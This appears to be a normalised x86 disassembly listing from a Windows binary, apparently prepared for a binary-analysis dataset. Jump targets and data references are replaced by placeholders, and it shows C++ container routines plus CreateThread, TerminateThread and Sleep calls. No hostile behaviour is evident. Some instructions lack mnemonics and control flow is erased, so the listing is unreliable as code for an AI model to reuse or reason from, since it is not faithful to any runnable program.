test ecx ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov ecx [ ebp - 0x28 ]
mov esi [ ebp - 0x24 ]
mov ebx [ ebp - 0x10 ]
mov [ edi + 0x4 ] esi
mov [ edi ] ecx
mov ecx [ ebx + 0x18 ]
mov edx [ ecx ]
mov eax [ edx ]
call eax
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ebx [ ebp - 0x10 ]
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_402060
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
xor eax eax
push 0xffffffff
push eax
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] ax
call sub_401ae0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_402090
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx ecx
mov eax [ ebx + 0x38 ]
push esi
mov esi [ TerminateThread@IAT ]
push edi
mov edi [ CloseHandle@IAT ]
mov [ ebx ] r--data
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
push 0x0
push eax
call esi
mov eax [ ebx + 0x38 ]
push eax
call edi
mov edx [ ebx + 0x8 ]
cmp edx [ ebx + 0xc ]
je r-xdata
push 0x0
push eax
call esi
mov ecx [ ebx + 0x34 ]
push ecx
call edi
cmp [ ebx + 0x2c ] 0x0
mov [ ebp - 0x4 ] 0x0
jbe r-xdata
mov ecx [ ebx + 0xc ]
mov esi edx
cmp esi ecx
je r-xdata
lea ecx [ ebx + 0x1c ]
call sub_410ba0
mov eax [ ebx + 0x1c ]
push eax
call sub_41a0d6
xor edi edi
mov [ ebx + 0x1c ] edi
mov eax [ ebx + 0x8 ]
add esp 0x4
cmp eax edi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebx + 0x1c ]
call sub_4019f0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov eax ecx
sub eax ecx
sar eax 0x2
lea edi [ eax * 4 ]
push edi
push ecx
push esi
call sub_41a460
add esp 0xc
add edi esi
mov [ ebx + 0xc ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0xc ] edi
mov [ ebx + 0x10 ] edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_41a0d6
add esp 0x4
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov edi [ eax + ecx * 4 ]
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov edi [ edx + 0x8 ]
mov eax ecx
shr eax 0x2
and ecx 0x3
cmp edi eax
ja r-xdata
test edi edi
je r-xdata
mov edx [ ebx + 0x24 ]
inc [ ebx + 0x28 ]
add edx edx
add edx edx
cmp edx [ ebx + 0x28 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp eax [ ebx + 0x2c ]
jb r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
dec eax
mov [ ebx + 0x2c ] eax
jne r-xdata
mov [ ebx + 0x28 ] 0x0
push edi
call sub_41a0d6
add esp 0x4
push eax
call sub_41a7eb
add esp 0x4
mov [ ebx + 0x28 ] 0x0
sub_402200
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp [ ecx + 0x2c ] eax
je r-xdata
mov esp ebp
pop ebp
retn
push esi
lea esi [ ecx + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
mov ecx esi
call sub_4019f0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov eax [ eax + ecx * 4 ]
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov eax ecx
push edi
mov edi [ edx + 0x8 ]
shr eax 0x2
and ecx 0x3
cmp edi eax
ja r-xdata
pop edi
pop esi
mov edi [ esi + 0x8 ]
inc [ esi + 0xc ]
add edi edi
add edi edi
cmp edi [ esi + 0xc ]
ja r-xdata
dec ecx
mov [ esi + 0x10 ] ecx
jne r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0xc ] 0x0
sub_402280
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax edi
sub eax ebx
sar eax 0x2
cmp eax 0x20
jle r-xdata
cmp eax 0x1
jle r-xdata
mov esi [ ebp + 0x10 ]
mov edi edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x14 ]
push 0x0
push edx
push edi
push ebx
call sub_401800
add esp 0x10
cmp eax 0x20
jle r-xdata
mov eax [ ebp + 0x14 ]
push eax
push edi
lea ecx [ ebp - 0x8 ]
push ebx
push ecx
call sub_401be0
mov ecx [ ebp - 0x8 ]
mov eax esi
cdq
sub eax edx
sar eax 0x1
mov esi eax
cdq
sub eax edx
sar eax 0x1
add esi eax
mov eax [ ebp - 0x4 ]
mov edx edi
sub edx eax
sub ecx ebx
and edx 0xfffffffc
and ecx 0xfffffffc
add esp 0x10
cmp ecx edx
jge r-xdata
mov edx edi
sub edx ebx
and edx 0xfffffffc
cmp edx 0x4
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
push esi
push edi
push eax
call sub_402280
mov edi [ ebp - 0x8 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp - 0x8 ]
push edx
push esi
push eax
push ebx
call sub_402280
mov ebx [ ebp - 0x4 ]
jmp r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
push edi
push ebx
call sub_401d90
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x14 ]
push 0x0
push 0x0
push eax
push edi
push ebx
call sub_401750
add esp 0x14
test esi esi
jle r-xdata
mov eax edi
sub eax ebx
sar eax 0x2
add esp 0x10
cmp eax 0x20
jg r-xdata
sub_402370
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
xor ecx ecx
mov [ esi ] cx
pop esi
pop ebp
retn
mov eax [ esi ]
push eax
call sub_41a0d6
add esp 0x4
sub_4023a0
push ebp
mov ebp esp
push 0xffffffff
push sub_42ce1b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
xor ebx ebx
mov [ esi ] r--data
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
lea edi [ esi + 0x1c ]
push 0x8
mov [ ebp - 0x4 ] ebx
mov [ edi ] ebx
call sub_41ac18
add esp 0x4
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_419f97
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_41ac98
int3
mov [ edi ] eax
xor ecx ecx
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ edi ]
mov [ eax ] edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x34 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_402460
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
nop
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_41a0d6
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_4024a0
push ebp
mov ebp esp
push 0xffffffff
push sub_42ce51
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
lea edi [ ebx + 0x7 ]
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x1c
add eax 0x1c
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
mov [ ebp + 0x8 ] eax
jmp r-xdata
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
push ebx
mov [ esi ] cx
push eax
mov ecx esi
call sub_401ae0
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
je r-xdata
sub_40251d
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_41ac98
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x14 ]
lea ebx [ ebx ]
push esi
push ebx
call sub_402370
add esi 0x1c
add esp 0x8
cmp esi edi
jne r-xdata
sub_402560
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push eax
add ecx 0xc
push ecx
mov ecx [ ebp + 0xc ]
push ecx
push edx
call sub_402460
add esp 0x10
pop ebp
retn 0x8
sub_402580
push ebp
mov ebp esp
push 0xffffffff
push sub_42ce70
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ebx [ ebp + 0x8 ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
mov eax 0x0
shr edi 0x1f
add edi edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edi 0x9249249
jbe r-xdata
lea ecx [ esi + 0xc ]
push edi
call sub_401280
lea ecx [ edi * 8 ]
sub ecx edi
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x8 ] edx
mov edx [ ebp + 0x8 ]
push edx
lea edx [ esi + 0xc ]
push edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov ecx [ ebx + 0x4 ]
mov ebx [ ebx ]
push eax
push ecx
push ebx
mov [ ebp - 0x4 ] 0x0
call sub_4024a0
add esp 0x14
mov [ esi + 0x4 ] eax
push r--data
call sub_4194e6
sub_402660
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_402460
mov edx [ esi ]
push edx
call sub_41a0d6
add esp 0x14
sub_4026b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov cx [ eax ]
mov [ esi ] cx
mov dl [ eax + 0x2 ]
mov [ esi + 0x2 ] dl
mov cl [ eax + 0x3 ]
add eax 0x4
mov [ esi + 0x3 ] cl
push eax
lea ecx [ esi + 0x4 ]
call sub_402580
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4026e0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x8 ]
lea edx [ esi + 0x10 ]
push edx
push ecx
push eax
call sub_402460
mov edx [ esi + 0x4 ]
push edx
call sub_41a0d6
add esp 0x14
sub_402730
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push edi
mov edi ecx
lea ecx [ ebp - 0x14 ]
push ecx
mov ecx esi
call edx
cmp [ eax ] 0x0
jne r-xdata
xor al al
mov ecx [ eax + 0x4 ]
cmp ecx [ eax + 0x8 ]
jne r-xdata
test bl bl
pop ebx
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0xc ]
lea ecx [ ebp - 0x4 ]
push ecx
push edx
push eax
call sub_402460
mov eax [ ebp - 0x10 ]
push eax
call sub_41a0d6
add esp 0x14
mov al 0x1
jmp r-xdata
mov ecx [ edi + 0x18 ]
test ecx ecx
je r-xdata
pop edi
xor al al
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp al 0x1
mov eax [ ebp - 0x10 ]
push ebx
sete bl
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
test al al
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0xc ]
call eax
mov [ edi + 0x18 ] esi
pop edi
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_4027c0
push ebp
mov ebp esp
push 0xffffffff
push sub_42ce98
mov eax [ fs : 0x0 ]
push eax
sub esp 0x54
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
lea edx [ ebp - 0x4c ]
push edx
mov [ ebp - 0x18 ] 0x0
call eax
mov ebx [ ebp - 0x48 ]
mov ecx [ ebp - 0x44 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
movzx edx [ ebp - 0x49 ]
imul edi edx
test ebx ebx
je r-xdata
mov [ ebp - 0x20 ] edi
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x3c ]
push ecx
push edx
push ebx
call sub_402460
mov eax [ ebp - 0x48 ]
push eax
call sub_41a0d6
add esp 0x14
mov ecx [ esi + 0x18 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
call eax
test al al
jne r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
lea ecx [ ebp - 0x24 ]
push ecx
lea ecx [ esi + 0x1c ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x14 ] eax
call sub_413120
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
mov eax [ ebp - 0x18 ]
mov ecx eax
inc eax
mov [ ebp - 0x18 ] eax
cmp ecx [ ebp - 0x20 ]
jne r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov ecx [ esi + 0x4 ]
cmp [ ebp - 0x14 ] eax
mov eax [ ecx ]
jae r-xdata
mov edx [ eax + 0x4 ]
call edx
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov edx [ eax + 0x8 ]
call edx
mov ecx [ ebp - 0x1c ]
add ecx eax
mov eax ecx
imul eax ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ esi + 0xc ]
sub eax [ esi + 0x8 ]
sar eax 0x2
cmp eax 0x1
jbe r-xdata
mov ecx [ ebp - 0x14 ]
push ecx
call [ Sleep@IAT ]
mov edx [ esi + 0x18 ]
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
mov edi [ edx ]
mov edx [ eax ]
call edx
mov ecx [ esi + 0x18 ]
push eax
mov eax [ edi + 0x4 ]
call eax
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
mov [ ebp - 0xd ] 0x0
test eax eax
je r-xdata
xor eax eax
lea ecx [ ecx ]
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x4 ] 0xffffffff
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x24 ]
push ecx
mov ecx [ ebp - 0x44 ]
lea edx [ ebp - 0x3c ]
push edx
push ecx
push eax
call sub_402460
mov edx [ ebp - 0x48 ]
push edx
call sub_41a0d6
add esp 0x14
mov ecx [ esi + 0xc ]
sub ecx [ esi + 0x8 ]
sar ecx 0x2
test bl bl
jne r-xdata
mov ecx [ ebp - 0x24 ]
push ecx
mov ecx [ ebp - 0x58 ]
lea edx [ ebp - 0x50 ]
push edx
push ecx
push eax
call sub_402460
mov edx [ ebp - 0x5c ]
push edx
call sub_41a0d6
add esp 0x14
movzx eax [ ebp - 0xd ]
inc eax
xor edx edx
div ecx
mov eax [ esi + 0x8 ]
movzx edx dl
mov ecx [ eax + edx * 4 ]
push ecx
mov ecx esi
call sub_402730
mov ecx [ esi + 0x18 ]
mov edx [ ecx ]
mov edx [ edx + 0x14 ]
lea eax [ ebp - 0x38 ]
push eax
call edx
mov ebx [ ebp - 0x34 ]
mov ecx [ ebp - 0x30 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
movzx ecx [ ebp - 0x35 ]
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
xor eax eax
imul edi ecx
cmp ebx eax
je r-xdata
mov al [ ebp - 0xd ]
inc al
mov [ ebp - 0xd ] al
movzx eax al
cmp eax ecx
jb r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x20 ] edi
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x30 ]
push edx
lea eax [ ebp - 0x28 ]
push eax
push ecx
push ebx
call sub_402460
mov edx [ ebp - 0x34 ]
push edx
call sub_41a0d6
add esp 0x14
xor eax eax
mov edx [ esi + 0x8 ]
mov edi [ edx + eax * 4 ]
mov ecx [ esi + 0x18 ]
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
lea edx [ ebp - 0x60 ]
push edx
call eax
mov ebx eax
mov edx [ edi ]
mov edx [ edx + 0x14 ]
lea eax [ ebp - 0x4c ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x0
call edx
mov ax [ eax ]
cmp ax [ ebx ]
mov eax [ ebp - 0x48 ]
sete bl
xor edi edi
cmp eax edi
je r-xdata
jmp r-xdata
sub_402a60
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx ecx
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x8 ]
push esi
sar eax 0x2
push edi
mov [ ebp - 0x1 ] 0x0
test eax eax
je r-xdata
pop edi
pop esi
xor al al
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov edi [ ebp - 0x10 ]
cmp esi edi
je r-xdata
movzx edx [ ebp - 0x1 ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax + edx * 4 ]
push ecx
mov ecx ebx
call sub_402730
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov al [ ebp - 0x1 ]
mov ecx [ ebx + 0xc ]
sub ecx [ ebx + 0x8 ]
inc al
mov [ ebp - 0x1 ] al
movzx eax al
sar ecx 0x2
cmp eax ecx
jb r-xdata
push esi
call sub_41a0d6
add esp 0x4
lea esp [ esp ]
mov ecx [ ebx + 0x8 ]
mov ecx [ ecx + eax * 4 ]
mov edx [ ecx ]
mov edx [ edx + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call edx
mov cx [ ebp + 0x8 ]
cmp [ eax ] cx
mov esi [ ebp - 0x14 ]
sete [ ebp - 0x2 ]
test esi esi
je r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
add esi 0x1c
cmp esi edi
jne r-xdata
mov edx [ esi ]
push edx
call sub_41a0d6
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov esi [ ebp - 0x14 ]
sub_402b40
push ebp
mov ebp esp
push 0xffffffff
push sub_42cec8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
lea edx [ ebp - 0x34 ]
push edx
call eax
mov esi eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov edx [ edx + 0x14 ]
lea eax [ ebp - 0x20 ]
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call edx
mov cl [ esi + 0x2 ]
cmp cl [ eax + 0x2 ]
mov eax [ ebp - 0x1c ]
setb bl
cmp eax edi
je r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
cmp eax edi
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x18 ]
lea ecx [ ebp - 0x10 ]
push ecx
push edx
push eax
call sub_402460
mov eax [ ebp - 0x1c ]
push eax
call sub_41a0d6
add esp 0x14
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x2c ]
lea edx [ ebp - 0x24 ]
push edx
push ecx
push eax
call sub_402460
mov edx [ ebp - 0x30 ]
push edx
call sub_41a0d6
add esp 0x14
sub_402c00
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
mov eax [ esi + 0xc ]
sub eax [ esi + 0x8 ]
test eax 0xfffffffc
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
push ecx
mov ecx esi
call sub_402730
test al al
je r-xdata
push edi
mov edi [ CreateThread@IAT ]
lea edx [ ebp - 0x4 ]
push edx
push 0x0
push esi
push sub_401100
push 0x0
push 0x0
call edi
mov [ esi + 0x38 ] eax
test eax eax
je r-xdata
pop edi
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push esi
push sub_401080
push 0x0
push 0x0
call edi
mov [ esi + 0x34 ] eax
sub_402c70
push ebp
mov ebp esp
push 0xffffffff
push sub_42cef8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ edi + 0xc ]
sub eax [ edi + 0x8 ]
xor ebx ebx
sar eax 0x2
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xd ] bl
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
mov edi [ edi + 0x8 ]
mov edx eax
sub edx edi
push sub_402b40
sar edx 0x2
push edx
push eax
push edi
call sub_402280
mov esi [ ebp + 0xc ]
add esp 0x10
cmp esi ebx
je r-xdata
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
cmp [ ebp - 0xe ] 0x0
je r-xdata
mov ebx [ ebp - 0x20 ]
cmp esi ebx
je r-xdata
push esi
call sub_41a0d6
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov al [ ebp - 0xd ]
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x8 ]
inc al
mov [ ebp - 0xd ] al
movzx eax al
sar ecx 0x2
mov [ ebp - 0x14 ] eax
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov esi [ eax + ecx * 4 ]
mov dx [ ebp + 0x8 ]
sub esp 0x14
mov eax esp
mov [ eax ] dx
mov cl [ ebp + 0xa ]
mov [ eax + 0x2 ] cl
mov dl [ ebp + 0xb ]
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x14 ] esp
push ecx
lea ecx [ eax + 0x4 ]
mov [ eax + 0x3 ] dl
call sub_402580
mov edx [ esi ]
mov eax [ edx + 0x18 ]
mov ecx esi
call eax
push esi
call sub_41a0d6
add esp 0x4
xor ebx ebx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_41a0d6
add esp 0x4
mov ecx [ edi + 0x8 ]
mov edx [ ebp - 0x14 ]
mov ecx [ ecx + edx * 4 ]
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
lea edx [ ebp - 0x28 ]
push edx
call eax
mov cx [ eax ]
cmp cx [ ebp + 0x8 ]
mov esi [ ebp - 0x24 ]
sete [ ebp - 0xe ]
cmp esi ebx
je r-xdata
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] dx
add esi 0x1c
cmp esi ebx
jne r-xdata
mov eax [ esi ]
push eax
call sub_41a0d6
add esp 0x4
mov esi [ ebp + 0xc ]
mov esi [ ebp - 0x24 ]
sub_402e20
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_402e50
push ebp
mov ebp esp
push 0xffffffff
push sub_42cf20
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x0
call edx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_402f50
push esi
mov esi [ ecx + 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push esi
call sub_41a0d6
add esp 0x4
push eax
call sub_41a7eb
add esp 0x4
sub_402f80
movzx eax [ ecx + 0x40 ]
push esi
mov esi [ ecx + 0x34 ]
sub esi [ ecx + 0x30 ]
inc eax
sar esi 0x2
xor edx edx
div esi
pop esi
mov [ ecx + 0x40 ] dl
mov ecx [ ecx + 0x30 ]
movzx eax dl
mov eax [ ecx + eax * 4 ]
retn
sub_402fb0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0x3fffffff
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_419f97
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_41ac98
lea eax [ ecx * 4 ]
push eax
call sub_41ac18
add esp 0x4
test eax eax
jne r-xdata
sub_403010
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
